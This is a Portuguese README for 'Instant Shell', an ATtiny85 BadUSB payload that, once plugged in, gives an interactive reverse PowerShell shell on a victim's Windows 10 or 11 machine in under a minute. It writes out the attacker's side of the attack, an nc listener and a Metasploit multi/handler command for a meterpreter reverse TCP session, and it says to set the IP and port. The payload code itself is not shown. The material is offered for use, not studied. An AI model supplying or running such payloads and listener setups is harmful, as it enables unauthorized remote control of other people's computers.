# Instant Shell

### Descrição:

#### 1: Instant_Shell.ino:<br>

**Payload por:** [hum4nG0D](https://github.com/hum4nG0D/)

Obtenha um shell PowerShell interativo reverso em menos de um minuto e envie comandos remotamente para a máquina da vítima. Script interativo de shell PowerShell reverso por [Nikhil SamratAshok Mittal](http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html)

**Instruções:**
Inicie um listener nc ou um listener metasploit. Certifique-se de alterar o IP e a porta. Ajuste o atraso do script conforme o necessário para o seu computador.

```
nc -lvnp 4444
```

```
msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP_ADDRESS>; set lport 4444; set ExitOnSession false; exploit -j"
```

**Testado em:**<br>
**Sistema Operacional**: Windows 10|11<br>
**Usuário**: Administrador/Usuário Normal<br>
**Hardware**: ATtiny85
